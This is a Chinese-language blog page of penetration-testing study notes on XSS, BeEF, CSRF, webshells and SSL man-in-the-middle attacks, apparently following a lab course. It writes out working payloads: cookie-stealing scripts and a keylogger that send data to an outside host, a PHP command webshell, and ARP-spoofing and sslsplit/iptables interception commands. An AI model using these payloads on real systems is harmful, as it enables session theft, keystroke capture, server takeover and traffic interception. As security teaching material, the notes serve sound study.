@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="XSS 攻击web客户端  客户端脚本语言  弹窗告警，广告 JavaScript 在浏览器中执行   XSS（cross-site scripting)  通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击的目的 注入客户端脚本代码 盗取cookie 重定向   VBScript, ActiveX or Flash  JavaScript  与Java语言无关 命名完全出于市场原因">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS漏洞等笔记">
+<meta property="og:url" content="http://yoursite.com/2018/04/23/XSS漏洞等笔记/index.html">
+<meta property="og:site_name" content="Chace Blog">
+<meta property="og:description" content="XSS 攻击web客户端  客户端脚本语言  弹窗告警，广告 JavaScript 在浏览器中执行   XSS（cross-site scripting)  通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击的目的 注入客户端脚本代码 盗取cookie 重定向   VBScript, ActiveX or Flash  JavaScript  与Java语言无关 命名完全出于市场原因">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-04-23T09:11:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS漏洞等笔记">
+<meta name="twitter:description" content="XSS 攻击web客户端  客户端脚本语言  弹窗告警，广告 JavaScript 在浏览器中执行   XSS（cross-site scripting)  通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击的目的 注入客户端脚本代码 盗取cookie 重定向   VBScript, ActiveX or Flash  JavaScript  与Java语言无关 命名完全出于市场原因">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>XSS漏洞等笔记</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/05/12/一次简单的流量重定向/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/04/21/SQL注入笔记/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/23/XSS漏洞等笔记/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&text=XSS漏洞等笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&is_video=false&description=XSS漏洞等笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS漏洞等笔记&body=Check out this article: http://yoursite.com/2018/04/23/XSS漏洞等笔记/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&title=XSS漏洞等笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/23/XSS漏洞等笔记/&name=XSS漏洞等笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BEEF"><span class="toc-number">1.1.</span> <span class="toc-text">BEEF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEBSHELL"><span class="toc-number">1.3.</span> <span class="toc-text">WEBSHELL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTPS攻击"><span class="toc-number">1.4.</span> <span class="toc-text">HTTPS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL-中间人攻击"><span class="toc-number">1.4.1.</span> <span class="toc-text">SSL 中间人攻击</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XSS漏洞等笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Chace Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-04-23T09:09:48.000Z" itemprop="datePublished">2018-04-23</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ul>
+<li><p>攻击web客户端</p>
+</li>
+<li><p>客户端脚本语言</p>
+<ul>
+<li>弹窗告警，广告</li>
+<li>JavaScript</li>
+<li>在浏览器中执行</li>
+</ul>
+</li>
+<li><p>XSS（cross-site scripting)</p>
+<ul>
+<li>通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击的目的</li>
+<li>注入客户端脚本代码</li>
+<li>盗取cookie</li>
+<li>重定向</li>
+</ul>
+</li>
+<li><p>VBScript, ActiveX or Flash</p>
+</li>
+<li><p>JavaScript</p>
+<ul>
+<li>与Java语言无关</li>
+<li>命名完全出于市场原因</li>
+<li>使用最广的客户端脚本语言</li>
+</ul>
+</li>
+<li><p>使用场景</p>
+<ul>
+<li>直接嵌入html：<code>&lt;script&gt; alert(‘XSS’); &lt;/script&gt;</code></li>
+<li>元素标签事件：<code>&lt;body onload=alert(‘XSS’)&gt;</code></li>
+<li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></li>
+<li>其他标签：<code>&lt;iframe&gt;, &lt;div&gt;, and &lt;link&gt;</code></li>
+<li>DOM对象，篡改页面内容</li>
+</ul>
+</li>
+<li><p>攻击参与方</p>
+<ul>
+<li>攻击者</li>
+<li>被攻击者</li>
+<li>漏洞站点</li>
+<li>第三方站点（攻击目标，攻击参与站）</li>
+</ul>
+</li>
+<li><p>漏洞形成的根源</p>
+</li>
+<li><ul>
+<li>服务器对用户提交数据过滤不严</li>
+<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
+<li>脚本在客户端执行恶意操作</li>
+</ul>
+</li>
+<li><p>XSS漏洞类型</p>
+</li>
+<li><ul>
+<li>存储型（持久型）</li>
+<li>反射型（非持久）</li>
+<li>DOM型</li>
+</ul>
+</li>
+<li><p>漏洞PoC</p>
+</li>
+<li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href='' onclick=alert('xss')&gt;type&lt;/</span>a&gt;</span><br><span class="line">&lt;img src=http:<span class="comment">//1.1.1.1/a.ipg onerror=alert('xss')&gt;</span></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=‘http:<span class="comment">//1.1.1.1'&lt;/script&gt;</span></span><br><span class="line">&lt;iframe SRC=<span class="string">"http://1.1.1.1/victim"</span> height = <span class="string">"0"</span> width =<span class="string">"0"</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;<span class="keyword">new</span> Image().src=<span class="string">"http://1.1.1.1/c.php?</span></span><br><span class="line"><span class="string">output="</span>+<span class="built_in">document</span>.cookie;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">document</span>.body.innerHTML=<span class="string">"&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS</span></span><br><span class="line"><span class="string">WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;"</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>窃取cookie</p>
+</li>
+<li><p><code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt;</code></p>
+</li>
+<li><p>a.js</p>
+</li>
+<li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://1.1.1.1/cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>keylogger.js</p>
+</li>
+<li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">evt = evt || <span class="built_in">window</span>.event</span><br><span class="line">key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line"><span class="keyword">if</span> (key) &#123;</span><br><span class="line"><span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> param = <span class="built_in">encodeURI</span>(key)</span><br><span class="line">http.open(<span class="string">"POST"</span>,<span class="string">"http://192.168.20.8/keylogger.php"</span>,<span class="literal">true</span>);</span><br><span class="line">http.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">http.send(<span class="string">"key="</span>+param);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Xsser</p>
+<ul>
+<li>命令行/图形化工具</li>
+<li>绕过服务器端输入筛选<ul>
+<li>10进制/16进制编码</li>
+<li>unescape()</li>
+</ul>
+</li>
+<li><code>xsser -u “http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=low; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -s -v --reverse-check</code></li>
+<li>–heuristic 检查被过滤的字符</li>
+</ul>
+</li>
+<li>对payload编码，绕过服务器端筛选过滤<br>–Str Use method String.FromCharCode()<br>–Une Use Unescape() function<br>–Mix Mix String.FromCharCode() and Unescape()<br>–Dec Use Decimal encoding<br>–Hex Use Hexadecimal encoding<br>–Hes Use Hexadecimal encoding, with semicolons<br>–Dwo Encode vectors IP addresses in DWORD<br>–Doo Encode vectors IP addresses in Octal<br>–Cem=CEM Try -manually- different Character Encoding Mutations<br>(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li>
+<li><p>注入技术（多选）<br>–Coo Cross Site Scripting Cookie injection<br>–Xsa Cross Site Agent Scripting<br>–Xsr Cross Site Referer Scripting<br>–Dcp Data Control Protocol injections<br>–Dom Document Object Model injections<br>–Ind HTTP Response Splitting Induced code<br>–Anchor Use Anchor Stealth payloader (DOM shadows!)<br>–Phpids PHP - Exploit PHPIDS bug (0.6.5) to bypass filters<br>–Doss XSS Denial of service (server) injection<br>–Dos XSS Denial of service (client) injection<br>–B64 Base64 code encoding in META tag (rfc2397)<br>–Onm ONM - Use onMouseMove() event to inject code<br>–Ifr Use <iframe> source tag to inject code</iframe></p>
+</li>
+<li><p>存储型XSS</p>
+<ul>
+<li>长期存储于服务器端</li>
+<li>每次用户访问都会被执行javascript脚本</li>
+</ul>
+</li>
+<li>Name：客户端表单长度限制<ul>
+<li>客户端，截断代理</li>
+</ul>
+</li>
+<li><code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt;</code></li>
+<li><p>a.js源码</p>
+  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://1.1.1.1:88/cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>DOM型XSS</p>
+<ul>
+<li>一套JS和其他语言可调用的标准的API</li>
+<li><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h2><ul>
+<li>浏览器攻击面<ul>
+<li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li>
+<li>结合社会工程学方法对浏览器进行攻击</li>
+<li>攻击浏览器用户</li>
+<li>通过注入的JS脚本，利用浏览器攻击其他网站</li>
+</ul>
+</li>
+<li>BEEF（Browser exploitation framework)<ul>
+<li>生成、交付payload</li>
+<li>Ruby 语言编写</li>
+<li>服务器端：管理hooked客户端</li>
+<li>客户端：运行于客户端浏览器的JavaScript脚本</li>
+</ul>
+</li>
+<li>攻击手段<ul>
+<li>利用网站XSS漏洞实现攻击</li>
+<li>诱使客户端访问含有hook的伪造站点</li>
+<li>结合中间人攻击注入hook脚本</li>
+</ul>
+</li>
+<li>常见用途<ul>
+<li>键盘记录器</li>
+<li>网络扫描</li>
+<li>浏览器信息收集</li>
+<li>绑定shell</li>
+<li>与metasploit集成</li>
+</ul>
+</li>
+<li>演示页面：<code>http://&lt;IP_BeEF_Server&gt;:3000/demos/basic.html</code></li>
+<li>Details:<ul>
+<li>浏览器、插件版本信息；操作系统信息</li>
+</ul>
+</li>
+<li>Logs:<ul>
+<li>浏览器动作：焦点变化、鼠标点击、信息输入</li>
+</ul>
+</li>
+<li>Commands: 命令模块<ul>
+<li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li>
+<li>红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行</li>
+<li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li>
+<li>灰色模块：模块未在目标浏览器上测试过</li>
+</ul>
+</li>
+<li>主要模块<ul>
+<li>Browsers</li>
+<li>Exploits</li>
+<li>Host</li>
+<li>Persistence</li>
+<li>Network<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2></li>
+</ul>
+</li>
+<li>Cross-site request forgery</li>
+<li>与XSS经常混淆</li>
+<li>从信任的角度来区分<ul>
+<li>XSS：利用用户对站点的信任</li>
+<li>CSRF：利用站点对已经身份认证的信任</li>
+</ul>
+</li>
+<li>结合社工在身份认证会话过程中实现攻击<ul>
+<li>修改账号密码，个人信息（Email，收货地址）</li>
+<li>发送伪造的业务请求（网银，购物，投票）</li>
+<li>关注他人的社交账号，推送博文</li>
+<li>在用户非自愿，不知情的情况下提交请求</li>
+</ul>
+</li>
+<li>业务逻辑漏洞<ul>
+<li>对关键操作缺少确认机制</li>
+<li>自动扫描程序无法发现此类漏洞</li>
+</ul>
+</li>
+<li>漏洞利用条件<ul>
+<li>被害用户已经完成身份认证</li>
+<li>新请求的提交不需要重新身份认证或确认机制</li>
+<li>攻击者必须了解web APP请求的参数构造</li>
+<li>诱使用户触发攻击的指令（社工）</li>
+</ul>
+</li>
+<li>Burpsuite CSRF PoC generator<ul>
+<li>Post/Get 方法</li>
+</ul>
+</li>
+<li>自动扫描程序的检测方法<ul>
+<li>在请求和响应过程中检查是否存在anti-CSRF token名</li>
+<li>检查服务器是否验证anti-CSRF token的名值</li>
+<li>检查token中可编辑的字符串</li>
+<li>检查referrer头是否可以伪造</li>
+</ul>
+</li>
+<li>对策<ul>
+<li>Captcha</li>
+<li>anti-CSRF token</li>
+<li>Referrer头</li>
+<li>降低会话超时时间</li>
+</ul>
+</li>
+</ul>
+<h2 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h2><ul>
+<li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;_</code></li>
+<li>中国菜刀</li>
+<li>可能被IDS，AV，WAF，扫描器软件发现查杀</li>
+<li>WeBaCoo(web backdoor cookie)<ul>
+<li>类终端的shell</li>
+<li>编码通信内容通过cookie头传输，隐蔽性较强</li>
+<li>cm:base64编码的命令</li>
+<li>cn:服务器用于返回数据的cookie头的名</li>
+<li>cp:返回信息定界符</li>
+</ul>
+</li>
+<li>生成服务端<ul>
+<li>webacoo -g -o a.php</li>
+</ul>
+</li>
+<li>客户端连接<ul>
+<li>webacoo -t -u <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a></li>
+</ul>
+</li>
+<li>其他参数</li>
+<li>Weevely<ul>
+<li>隐蔽的类终端PHP webshell</li>
+<li>30多个管理模块<ul>
+<li>执行系统命令，浏览文件系统</li>
+<li>检查服务器常见配置错误</li>
+<li>创建正向，反向TCP SHELL连接</li>
+<li>通过目标计算机代理HTTP流量</li>
+<li>从目标计算机运行端口扫描，渗透内网</li>
+</ul>
+</li>
+<li>支持连接密码</li>
+</ul>
+</li>
+<li>生成服务端<ul>
+<li>weevely generate <password> b.php</password></li>
+<li>/usr/share/weevely/b.php</li>
+</ul>
+</li>
+<li>客户端连接服务器<ul>
+<li>weevely <a href="http://1.1.1.1/b.php" target="_blank" rel="noopener">http://1.1.1.1/b.php</a> <password>id</password></li>
+</ul>
+</li>
+</ul>
+<h2 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h2><ul>
+<li>全站HTTPS正成为潮流趋势</li>
+<li>HTTPS的作用<ul>
+<li>解决的是信息传输过程中数据被篡改，窃取</li>
+<li>加密： 对称，非对称，单项</li>
+</ul>
+</li>
+<li>HTTPS攻击方法<ul>
+<li>降级攻击</li>
+<li>解密攻击（明文，证书伪造）</li>
+<li>协议漏洞，实现方法的漏洞，配置不严格</li>
+</ul>
+</li>
+<li>Secure socket layer<ul>
+<li>保证网络通信安全的加密协议</li>
+<li>1994年由Netscape开发成为统一标准</li>
+<li>1999年TLS（transport layer security）取代SSL v3</li>
+<li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul>
+<li>Heartbleed</li>
+<li>POODLE</li>
+<li>BEAST</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>TLS当前最新版本</li>
+<li>TLS/SSL HTTPS HTTPS over SSL 通俗上表示同一含义</li>
+<li>SSL/TLS也被用于其他场景的传输通道加密<ul>
+<li>邮件传输（服务器间、客户端与服务器间）</li>
+<li>数据库服务器间</li>
+<li>LDAP身份认证服务器间</li>
+<li>SSL VPN</li>
+<li>远程桌面RDP通信过程中的加密和身份认证</li>
+</ul>
+</li>
+<li>web通信中的SSL<ul>
+<li>公钥证书（受信任的第三方公钥颁发机构签名颁发）</li>
+<li>VeriSign</li>
+<li>Thawte</li>
+<li>GolbalSign</li>
+<li>Symantec</li>
+</ul>
+</li>
+<li>加密过程<ul>
+<li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li>
+</ul>
+</li>
+<li>非对称加密算法<ul>
+<li>Diffie-Hellman key exchange</li>
+<li>Rivest Shamir Adleman(RSA)</li>
+<li>Elliptic Curve Cryptography(ECC)</li>
+</ul>
+</li>
+<li>对称加密算法<ul>
+<li>Data Encryption Standard(DES) / 3DES</li>
+<li>Advance Encryption Standard(AES)</li>
+<li>International Data Encryption Algorithm(IDEA)</li>
+<li>Rivest Cipher 4(RC4)<ul>
+<li>WEP,TLS/SSL,RDP,Secure shell</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>单向加密算法（HASH）</li>
+<li>SHA-3 已经设计完成，但尚未广泛使用</li>
+<li>SHA-2 是TLS 1.2 唯一支持的单向加密算法</li>
+<li>碰撞攻击针对单向加密算法<ul>
+<li>两个不同的文件生成相同的HASH值</li>
+</ul>
+</li>
+<li>SSL的弱点<ul>
+<li>SSL是不同的对称，非对称，单向加密算法的组合加密实现（cipher suite）</li>
+<li>服务端为提供更好的兼容性，选择支持大量过时cipher suite</li>
+<li>协商过程中强迫降级加密强度</li>
+<li>现代处理器计算能力可以在可接受的时间内破解过时加密算法</li>
+<li>购买云计算资源破解</li>
+</ul>
+</li>
+<li>Openssl<ul>
+<li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li>
+<li><code>openssl s_client -connect www.baidu.com:443</code></li>
+<li><code>openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code><ul>
+<li>密钥交换-身份认证-数据加密-HASH算法</li>
+</ul>
+</li>
+<li><code>openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code> （协商低安全级别cipher suite）</li>
+<li>可被破解的cipher suite<ul>
+<li>openssl ciphers -v “NULL,EXPORT,LOW,DES”</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>https://www.openssl.org/docs/apps/ciphers.html</code></li>
+<li>Openssl 需要大量密码学相关知识，命令复杂，结果可读性差</li>
+<li>SSLScan<ul>
+<li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li>
+<li>默认会检查crime，heart bleed漏洞</li>
+<li>绿色表示安全，红色黄色需要引起注意</li>
+<li>TLS支持的cipher suite<ul>
+<li><code>sslscan --tlsall www.taobao.com:443</code></li>
+</ul>
+</li>
+<li>分析证书详细信息<ul>
+<li><code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SSLyze<ul>
+<li>Python语言编写</li>
+<li>检查SSL过时版本</li>
+<li>检查存在弱点的cipher suite</li>
+<li>扫描多站点时，支持来源文件</li>
+<li>检查是否支持会话恢复</li>
+<li><code>sslyze --regular www.taobao.com:443</code></li>
+</ul>
+</li>
+<li>Nmap<ul>
+<li><code>nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></li>
+</ul>
+</li>
+<li><code>https://www.ssllabs.com/ssltest</code><h3 id="SSL-中间人攻击"><a href="#SSL-中间人攻击" class="headerlink" title="SSL 中间人攻击"></a>SSL 中间人攻击</h3></li>
+<li>攻击者位于客户端和服务器通信链路中<ul>
+<li>ARP</li>
+<li>DHCP</li>
+<li>修改网关</li>
+<li>修改DNS</li>
+<li>修改HOSTS</li>
+<li>ICMP,STP,OSPF</li>
+</ul>
+</li>
+<li>加密流量</li>
+<li>攻击的前提<ul>
+<li>客户端已经信任伪造证书颁发机构</li>
+<li>攻击者控制了核发证书颁发机构</li>
+<li>客户端程序禁止了显示证书错误告警信息</li>
+<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
+</ul>
+</li>
+<li>SSLsplit<ul>
+<li>透明SSL/TLS中间人攻击工具</li>
+<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
+<li>伪装服务器需要伪造证书</li>
+<li>支持SSL/TLS加密的SMTP，POP3，FTP等通信中间人攻击</li>
+</ul>
+</li>
+<li>利用openssl生成证书密钥<ul>
+<li><code>openssl genrsa -out ca.key 2048</code></li>
+</ul>
+</li>
+<li>利用私钥签名生成证书<ul>
+<li><code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code></li>
+</ul>
+</li>
+<li>启动路由<ul>
+<li><code>sysctl -w net.ipv4.ip_forward=1</code></li>
+</ul>
+</li>
+<li><p>Iptables端口转发规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSA</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3S</span><br><span class="line">Iptables -t nat -L</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ARP欺骗</p>
+<ul>
+<li><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></li>
+</ul>
+</li>
+<li>启动SSLsplit<ul>
+<li>mkdir -p test/logdir</li>
+<li><code>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></li>
+</ul>
+</li>
+<li>被害者访问taobao,baidu,mail.163.com</li>
+<li>查看日志和浏览器证书及证书报错信息</li>
+<li>安装服务器跟证书之后再次访问</li>
+<li><p>iptables端口转发规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Mitmproxy</p>
+<ul>
+<li><code>mitmproxy -T --host -w mitmproxy.log</code></li>
+</ul>
+</li>
+<li>SSLstrip<ul>
+<li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li>
+<li>ssltrip -l 8080</li>
+</ul>
+</li>
+<li>thc-ssl-dos<ul>
+<li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li>
+<li>利用SSL secure renegotiation特性，在单一TCP连接中生成数千个SSL重连请求，造成服务器资源过载</li>
+<li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器</li>
+<li>服务器平均可以处理300次/秒SSL握手请求</li>
+<li>对SMTPS，POP3 等服务同样有效</li>
+</ul>
+</li>
+<li>对策<ul>
+<li>禁用SSL-Renegotiation ,使用 SSL Accelerator</li>
+<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
+</ul>
+</li>
+<li>AJAX<ul>
+<li>Asynchronous JavaScript and XML</li>
